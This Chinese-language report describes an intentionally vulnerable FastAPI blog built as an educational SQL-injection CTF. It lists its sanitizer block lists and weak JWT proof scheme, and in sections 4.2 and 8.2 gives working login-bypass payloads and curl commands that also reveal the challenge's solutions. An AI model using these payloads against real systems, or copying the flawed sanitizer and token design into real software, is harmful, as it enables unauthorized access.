# 个人博客 CTF - 项目报告

## 执行摘要

**个人博客 CTF** 是一个故意设计为存在漏洞的 Web 应用程序，旨在作为专注于 SQL 注入漏洞的教育性夺旗竞赛（CTF）挑战。本项目作为一个教学工具，展示了安全漏洞如何由第三方依赖的行为引发，而非应用程序逻辑本身的缺陷。本项目明确用于教育目的，**不应**用作生产系统或安全参考。

---

## 1. 项目概述

### 1.1 目的与范围

本项目是一个自包含的、面向教学的 SQL 注入 CTF 服务，围绕一个简化的个人博客应用程序构建。主要教育目标是说明：

- 安全故障如何从依赖行为中产生
- 应用程序层面的业务逻辑可能看起来很干净，但仍然存在漏洞
- 部分验证如何创建可利用的安全漏洞
- 前端限制不能提供真正的保护

### 1.2 目标受众

- CTF 玩家和安全爱好者
- 安全学习者和教育工作者
- 挑战作者和安全研究人员

**注意：** 本项目**不适用于**生产部署或最佳实践参考。

---

## 2. 技术架构

### 2.1 技术栈

| 组件 | 技术 | 版本 |
|------|------|------|
| **运行时** | Python | 3.11+ |
| **Web 框架** | FastAPI | 最新版本 |
| **ASGI 服务器** | Uvicorn | - |
| **数据库** | MariaDB | - |
| **数据库驱动** | PyMySQL | - |
| **身份认证** | JWT (PyJWT) | - |
| **容器化** | Docker | - |

### 2.2 系统架构

```
┌─────────────┐
│   浏览器    │
└──────┬──────┘
       │ HTTP/HTTPS
       ▼
┌─────────────────────────────────────┐
│       FastAPI 应用程序              │
│  ┌───────────────────────────────┐  │
│  │   API 端点 (REST)             │  │
│  │   - /api/home                 │  │
│  │   - /api/login/user           │  │
│  │   - /api/login/admin          │  │
│  │   - /api/user/{username}      │  │
│  └───────────────────────────────┘  │
│  ┌───────────────────────────────┐  │
│  │   前端 (HTML/JS/CSS)          │  │
│  │   - index.html                │  │
│  │   - personal_space.html       │  │
│  │   - admin.html                │  │
│  └───────────────────────────────┘  │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│   ctf_sql.MySql (CTF 后端)          │
│   - 注入的漏洞                       │
│   - 部分清理机制                     │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│       MariaDB 数据库                │
│   - users, admins, posts, comments  │
│   - ctf_progress (flags)            │
└─────────────────────────────────────┘
```

### 2.3 关键设计特征

- **单源部署**：前端和后端在同一主机和端口上运行
- **容器优先模型**：在 Docker 中完全初始化的、可直接运行的 CTF 实例
- **CTF 模式强制执行**：在启动时硬编码，不支持运行时切换
- **依赖层漏洞**：SQL 注入在数据库驱动层引入
- **清晰的业务逻辑**：应用程序代码保持可读性和整洁性

---

## 3. 核心功能

### 3.1 用户功能

1. **首页 (`/`)**
   - 显示已发布的博客文章
   - 显示作者信息，包括电子邮件（故意的信息泄露）
   - 列出文章元数据（标题、创建日期、评论数）

2. **用户登录 (`/api/login/user`)**
   - 邮箱和密码身份验证
   - 登录成功后生成 JWT 令牌
   - 通过邮箱参数存在 SQL 注入漏洞

3. **个人空间 (`/personal_space`)**
   - 显示用户的私人文章
   - 需要有效的 JWT 令牌
   - 用户特定的内容检索

### 3.2 管理员功能

1. **管理员登录页面 (`ADMIN_LOGIN_URL`，默认 `/admin456_login`)**
   - 显示管理员登录表单的前端页面
   - 隐藏的 URL（可通过环境变量 `ADMIN_LOGIN_URL` 配置）

2. **管理员登录 API (`POST /api/login/admin`)**
   - 用户名和密码身份验证
   - 单独的 JWT 令牌生成
   - 通过用户名参数存在 SQL 注入漏洞

3. **管理员面板 (`ADMIN_URL`，默认 `/admin123`)**
   - 仅限管理员访问的界面
   - CTF 旗帜提交
   - 隐藏的 URL（可通过环境变量 `ADMIN_URL` 配置）

### 3.3 CTF 特定功能

1. **CTF 进度跟踪**
   - 两个旗帜：用户旗帜和管理员旗帜
   - 进度存储在 `ctf_progress` 表中
   - 可通过 `/api/flags` 查询状态

2. **旗帜提交**
   - `/api/user/answer/{jwt}`：提交用户旗帜
   - `/api/admin/answer/{jwt}`：提交管理员旗帜
   - 需要有效的 JWT 令牌

---

## 4. 安全模型（故意不安全）

### 4.1 故意设计的漏洞

本项目**故意违反**真实世界的安全实践：

1. **SQL 注入漏洞**
   - 用户登录：邮箱参数存在 SQL 注入漏洞
   - 管理员登录：用户名参数存在 SQL 注入漏洞
   - 基于 CVE-2019-12989 启发的漏洞模式

2. **弱身份验证**
   - 简化的 JWT 实现
   - 自定义证明机制（非加密强度）
   - 模拟密码哈希（非真正的 SHA-256 输出）

3. **信息泄露**
   - 在 `/api/home` 响应中暴露电子邮件地址
   - 弱令牌证明逻辑
   - 开放的 CORS 配置

4. **部分清理机制**
   - 基于正则表达式的过滤尝试
   - 设计为阻止简单的载荷，同时保留利用路径
   - 不是真正的安全功能，而是挑战塑造机制

### 4.2 漏洞设计

#### 用户登录 SQL 注入

**清理规则：**
- 阻止：`OR`, `=`, `>`, `<`, `LIKE`, `IN`, `BETWEEN`, `TRUE`, `FALSE`, `--`, `|`, `'#`, ` #`
- 阻止直接模式：`AND 1`, `(1)`
- **预期的利用模式**：`alice@example.com' AND ('1')#`

**查询构造：**
```sql
SELECT id, username, email
FROM users
WHERE email = %s AND password_hash = %s
```

#### 管理员登录 SQL 注入

**清理规则：**
- 阻止：`OR`, `=`, `>`, `<`, `LIKE`, `IN`, `BETWEEN`, `TRUE`, `FALSE`, `--`, `AND`, `'#`, ` #`
- 要求：第一个引号之前至少有 5 个拉丁字母（或无引号）
- 阻止：`|| 1`, `(1)`
- **预期的利用模式**：`{至少5个拉丁字母}' || ('1')#`

**查询构造：**
```sql
SELECT id FROM admins
WHERE username = %s AND password_hash = %s
```

### 4.3 依赖层漏洞注入

SQL 注入漏洞在数据库连接层注入：

```python
def get_conn(sanitizer: Optional[Callable[[str], str]] = None):
    if ctf_sql.SESSION_NAME == ctf_sql.constants.CTF_SESSION_NAME:
        return ctf_sql.MySql.connect(
            host=ctf_sql.DB_HOST,
            user=ctf_sql.DB_USER,
            passwd=ctf_sql.DB_PASS,
            db=ctf_sql.DB_NAME,
            sanitizer=sanitizer,
        )
```

这种设计确保：
- 业务逻辑保持清晰和可读
- 应用程序代码中没有 SQL 字符串操作
- 漏洞行为仅在连接时注入
- 应用程序逻辑易于审计和推理

---

## 5. 身份认证与授权

### 5.1 JWT 实现

#### 用户令牌

**令牌结构：**
```json
{
  "role": "user",
  "username": "字符串",
  "email": "字符串",
  "login_ts": 时间戳,
  "proof": "4位十六进制字符",
  "exp": 过期时间戳
}
```

**证明生成：**
```python
base = f"{username}{USER_MID_1}{email}{USER_MID_2}{ts}"
h = hashlib.sha256(base.encode()).hexdigest()
num = int(h, 16) + ADD_NUM
proof = hex(num)[2:].upper()[-4:]
```

#### 管理员令牌

**令牌结构：**
```json
{
  "role": "admin",
  "username": "字符串",
  "login_ts": 时间戳,
  "proof": "4位十六进制字符",
  "exp": 过期时间戳
}
```

**证明生成：**
```python
base = f"{username}{ADMIN_MID_1}{ADMIN_MID_2}{ts}"
h = hashlib.sha256(base.encode()).hexdigest()
num = int(h, 16) + ADD_NUM
proof = hex(num)[2:].upper()[-4:]
```

### 5.2 令牌验证

- 使用用户和管理员的独立密钥进行 JWT 签名验证
- 基于角色的访问控制
- 用户名绑定（用于用户令牌）
- 针对预期值的证明验证
- 过期检查

---

## 6. 数据库架构

### 6.1 核心表

#### `users`
- `id`：主键
- `username`：唯一标识符
- `email`：唯一电子邮件地址
- `password_hash`：SHA-256 哈希（CTF 中故意无效）
- `created_at`：时间戳

#### `admins`
- `id`：主键
- `username`：唯一标识符
- `password_hash`：SHA-256 哈希（CTF 中故意无效）
- `created_at`：时间戳

#### `posts`
- `id`：主键
- `title`：文章标题
- `content`：文章内容
- `author_id`：外键到 `users.id`
- `category_id`：外键到 `categories.id`（可选）
- `created_at`：时间戳
- `is_published`：布尔标志

#### `comments`
- `id`：主键
- `post_id`：外键到 `posts.id`
- `user_id`：外键到 `users.id`
- `content`：评论文本
- `created_at`：时间戳

#### `ctf_progress`
- `id`：主键
- `user_pwned`：用户旗帜的布尔标志
- `admin_pwned`：管理员旗帜的布尔标志

---

## 7. 部署模型

### 7.1 基于 Docker 的部署

项目遵循**CTF 优先、容器优先模型**：

1. **构建阶段**
   - 内部启动 MariaDB
   - 引导用户和数据库
   - 插入 CTF 数据
   - 重置旗帜
   - 关闭数据库
   - 将数据库状态冻结到镜像中

2. **运行时阶段**
   - 数据库状态已预初始化
   - 无运行时数据库配置
   - 配置在构建时冻结
   - 运行时配置仅限于密钥和路由

### 7.2 环境变量

#### 运行时可配置变量

这些可以在容器启动时覆盖：

| 变量 | 用途 | 默认值 |
|------|------|--------|
| `JWT_SECRET_USER` | 用户 JWT 签名密钥 | `dev-secret-for-ctf-user` |
| `JWT_SECRET_ADMIN` | 管理员 JWT 签名密钥 | `dev-secret-for-ctf-admin` |
| `JWT_ALGO` | JWT 算法 | `HS256` |
| `JWT_EXPIRE_SECONDS` | 令牌过期时间 | `3600` |
| `USER_MID_1`, `USER_MID_2` | 用户证明生成盐值 | 各种值 |
| `ADMIN_MID_1`, `ADMIN_MID_2` | 管理员证明生成盐值 | 各种值 |
| `ADD_NUM` | 证明生成偏移量 | `0xEEE7` |
| `ADMIN_URL` | 管理员面板 URL 路径 | `/admin123` |
| `ADMIN_LOGIN_URL` | 管理员登录 URL 路径 | `/admin456_login` |

#### 仅构建时变量

这些**不能**在运行时覆盖（在 Docker 构建期间使用）：

- `DB_HOST`, `DB_USER`, `DB_PASS`, `DB_NAME`
- `CTF_DB_HOST`, `CTF_DB_USER`, `CTF_DB_PASS`, `CTF_DB_NAME`

### 7.3 部署命令

**构建：**
```bash
docker build -t personal-blog-ctf .
```

**运行：**
```bash
docker run -p 8000:8000 \
  -e JWT_SECRET_USER=example_user_secret \
  -e JWT_SECRET_ADMIN=example_admin_secret \
  -e ADMIN_URL=/admin_hidden \
  -e ADMIN_LOGIN_URL=/login_hidden \
  personal-blog-ctf
```

**访问：**
```
http://localhost:8000
```

---

## 8. CTF 挑战设计

### 8.1 挑战目标

1. **用户旗帜挑战**
   - 从 `/api/home` 发现电子邮件地址
   - 在用户登录中利用 SQL 注入
   - 获取有效的 JWT 令牌
   - 通过 `/api/user/answer/{jwt}` 提交旗帜

2. **管理员旗帜挑战**
   - 定位管理员登录端点（隐藏 URL）
   - 在管理员登录中利用 SQL 注入
   - 获取有效的管理员 JWT 令牌
   - 通过 `/api/admin/answer/{jwt}` 提交旗帜

### 8.2 利用路径

#### 用户登录利用

**步骤 1：** 从 `/api/home` 提取电子邮件
```json
GET /api/home
响应: { ..., "email": "alice@example.com", ... }
```

**步骤 2：** 构造 SQL 注入载荷
```bash
email = "alice@example.com' AND ('1')#"
password = "anything"
```

**步骤 3：** 提交登录请求
```bash
curl -X POST http://127.0.0.1:8000/api/login/user \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "email=alice@example.com' AND ('1')#" \
  --data-urlencode "password=anything"
```

**步骤 4：** 提取 JWT 并提交旗帜
```bash
POST /api/user/answer/{jwt}
```

#### 管理员登录利用

**步骤 1：** 发现管理员登录页面 URL（隐藏，可配置）
```
GET /admin456_login  (默认，或自定义 ADMIN_LOGIN_URL)
```

**步骤 2：** 构造 SQL 注入载荷
```
username = "admin' || ('1')#"
password = "anything"
```

**注意：** 引号之前必须有至少 5 个拉丁字母。

**步骤 3：** 提交登录请求到 API 并获取管理员 JWT
```
POST /api/login/admin
Content-Type: application/x-www-form-urlencoded

username=admin' || ('1')#&password=anything
```

**步骤 4：** 提交管理员旗帜
```bash
POST /api/admin/answer/{jwt}
```

### 8.3 教育重点

此 CTF 教授：
- 如何识别 SQL 注入漏洞
- 理解部分清理绕过
- JWT 令牌操作和验证
- 从暴露的 API 收集信息
- 依赖级安全考虑

---

## 9. 代码结构

### 9.1 目录布局

```
Personal-Blog-CTF/
├── app/                      # 主应用程序代码
│   ├── __init__.py
│   ├── main.py              # FastAPI 应用程序和路由
│   ├── config.py            # 配置管理
│   ├── jwt_plugin.py        # JWT 生成和验证
│   └── properties.py        # 环境变量处理
├── frontend/                # 前端 HTML 文件
│   ├── index.html           # 首页
│   ├── personal_space.html  # 用户个人页面
│   ├── admin.html           # 管理员面板
│   └── admin_login.html     # 管理员登录页面
├── static/                  # 静态资源
│   ├── app.js              # 前端 JavaScript
│   └── style.css           # 样式表
├── scripts/                 # 数据库脚本
│   ├── db_bootstrap.py     # 数据库初始化
│   ├── init_prod.sql       # 生产架构
│   ├── reset_ctf.sql       # CTF 数据重置
│   └── run_*.py            # 脚本运行器
├── docker_scripts/          # Docker 相关脚本
│   ├── bootstrap_db.sh     # 构建时数据库设置
│   └── docker-entrypoint.sh # 运行时入口点
├── Dockerfile              # Docker 镜像定义
├── pyproject.toml          # Python 依赖
└── README.md               # 项目文档
```

### 9.2 关键模块

#### `app/main.py`
- FastAPI 应用程序初始化
- 所有端点的路由处理器
- SQL 注入清理函数
- 数据库连接管理
- JWT 验证逻辑

#### `app/jwt_plugin.py`
- JWT 令牌生成（用户和管理员）
- JWT 验证和验证
- 证明机制实现

#### `app/config.py`
- 配置 JSON 生成
- URL 路径配置
- 运行时配置转储

#### `app/properties.py`
- 环境变量解析
- 默认值管理
- 配置常量

---

## 10. 测试与验证

### 10.1 CTF 模式强制执行

CTF 模式在应用程序启动时硬编码：

```python
import builtins
builtins.CTF_MODE = "ctf"
```

这确保：
- 不依赖环境变量
- 不会意外回退到生产行为
- 确定性的 SQL 执行语义
- 可重现的利用路径

### 10.2 旗帜验证

旗帜通过以下方式验证：
1. JWT 令牌验证
2. 用户名绑定（用于用户旗帜）
3. 数据库状态更新
4. `ctf_progress` 表中的进度跟踪

### 10.3 挑战验证

**用户挑战：**
- 必须使用从 `/api/home` 泄露的电子邮件
- 必须利用 SQL 注入（不是密码猜测）
- 必须获取具有正确用户名的有效 JWT

**管理员挑战：**
- 必须发现隐藏的管理员 URL
- 必须利用具有特定约束的 SQL 注入
- 必须获取有效的管理员 JWT

---

## 11. 安全考虑

### 11.1 明确的非安全设计

本项目**故意违反**安全最佳实践：

- ❌ 无输入验证（除了 CTF 挑战塑造）
- ❌ 启用 SQL 注入漏洞
- ❌ 弱身份验证机制
- ❌ 信息泄露
- ❌ 开放的 CORS 配置
- ❌ 简化的 JWT 实现

**这些选择是为了教育目的而故意的。**

### 11.2 教育性安全教训

尽管故意设计为存在漏洞，本项目展示了：

1. **依赖安全**
   - 漏洞可能来自第三方库
   - 应用程序逻辑可能很干净，但依赖项不是
   - 安全审计必须包括依赖审查

2. **部分验证**
   - 不完整的清理会产生可利用的漏洞
   - 基于正则表达式的过滤器通常可以被绕过
   - 纵深防御至关重要

3. **信息泄露**
   - 暴露的数据可以帮助攻击者
   - 应遵循最少信息原则
   - 不应不必要地暴露敏感数据

4. **令牌安全**
   - JWT 令牌需要适当的验证
   - 证明机制应该是加密强度强的
   - 令牌绑定防止滥用

---

## 12. 限制与已知问题

### 12.1 设计限制

1. **单用户模式**：全局用户状态（不考虑并发）
2. **模拟密码哈希**：故意无效以强制 SQL 注入路径
3. **无生产模式**：仅 CTF 模式，无法安全用于生产
4. **简化的 JWT**：证明机制不是加密强度强的

### 12.2 已知约束

1. **前端限制**：某些 JavaScript 载荷可能被阻止，需要直接 API 交互
2. **基于正则表达式的清理**：可能有一些边缘情况未覆盖
3. **固定的数据库状态**：Docker 镜像有冻结的数据库状态
4. **无运行时配置**：数据库凭据无法在运行时更改

---

## 13. 未来增强（潜在）

虽然这是一个具有特定教育目标的 CTF 项目，但潜在的增强可能包括：

1. **其他漏洞类型**：XSS、CSRF、命令注入
2. **多级 CTF 挑战**：渐进式难度级别
3. **自动旗帜验证**：更复杂的验证
4. **挑战提示系统**：逐步提示披露
5. **评分机制**：基于积分的 CTF 竞赛评分

**注意：** 这些需要仔细考虑以保持教育价值。

---

## 14. 结论

个人博客 CTF 项目作为教授 SQL 注入漏洞和依赖级安全问题的有效教育工具。通过展示干净的应用程序逻辑如何由于依赖行为而仍然存在漏洞，它为安全学习者和 CTF 参与者提供了宝贵的教训。

容器优先、CTF 强制执行的设计确保了可重现的挑战，同时保持了清晰、可读的代码。故意的漏洞和部分清理机制创建了现实的利用场景，需要理解应用程序逻辑和依赖行为。

**本项目应作为教学工具进行研究，不应用作安全参考或生产系统。**

---

## 15. 参考文献

- **CVE-2019-12989**：SQL 注入漏洞模式的灵感来源
- **FastAPI 文档**：https://fastapi.tiangolo.com/
- **JWT 规范**：RFC 7519
- **OWASP Top 10**：SQL 注入漏洞类别
- **CTF 最佳实践**：教育性安全挑战设计

---

**报告生成时间：** 2024  
**项目版本：** 0.1.0  
**Python 版本：** 3.11+  
**许可证：** 仅用于教育/CTF 用途
